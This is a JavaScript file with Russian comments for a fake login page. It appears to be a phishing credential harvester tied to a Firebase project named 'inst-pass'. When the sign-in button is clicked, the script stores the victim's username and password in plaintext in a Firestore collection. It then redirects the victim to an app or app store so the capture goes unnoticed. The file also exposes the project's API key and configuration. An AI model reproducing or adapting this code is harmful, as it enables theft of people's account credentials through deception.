// Инициализация Firebase
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore.js";

// Конфигурация Firebase
const firebaseConfig = {
  apiKey: "AIzaSyA_nmSVob8pBBjxCmUIdsNk9-1m5m4fzVI",
  authDomain: "inst-pass.firebaseapp.com",
  projectId: "inst-pass",
  storageBucket: "inst-pass.firebasestorage.app",
  messagingSenderId: "480636301113",
  appId: "1:480636301113:web:06be256188fe5be663c2e8",
  measurementId: "G-BTZPEYEED0"
};

// Инициализация Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// Функция для добавления данных в Firestore
async function saveDataToFirestore(username, password) {
  try {
    // Добавление данных в Firestore
    await addDoc(collection(db, "users"), {
      username: username,
      password: password,
      timestamp: new Date(),
    });

    console.log("Данные пользователя добавлены в Firestore");
  } catch (error) {
    console.error("Ошибка при добавлении данных в Firestore:", error.message);
  }
}

// Обработчик события при клике на кнопку "Войти"
document.getElementById("signInBtn").addEventListener("click", function() {
    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;
  
    // Проверка на пустые поля
    if (username && password) {
      saveDataToFirestore(username, password);
      // Очистка полей ввода
      document.getElementById("username").value = "";
      document.getElementById("password").value = "";
  
      // Попытка открыть приложение через deep link
      window.location.href = "myapp://";  // Это должно открыть приложение, если оно установлено
  
      // Перенаправление в Play Store или App Store через задержку
      setTimeout(function() {
        // Проверка операционной системы и редирект в магазин приложений
        if (navigator.userAgent.match(/Android/i)) {
          window.location.href = "https://play.google.com/store/apps/details?id=com.example.app";  // для Android
        } else if (navigator.userAgent.match(/iPhone|iPad|iPod/i)) {
          window.location.href = "https://apps.apple.com/us/app/id1234567890";  // для iOS
        }
      }, 500);  // Задержка, чтобы дать время открыть приложение
    } else {
      alert("Пожалуйста, заполните все поля");
    }
  });
  
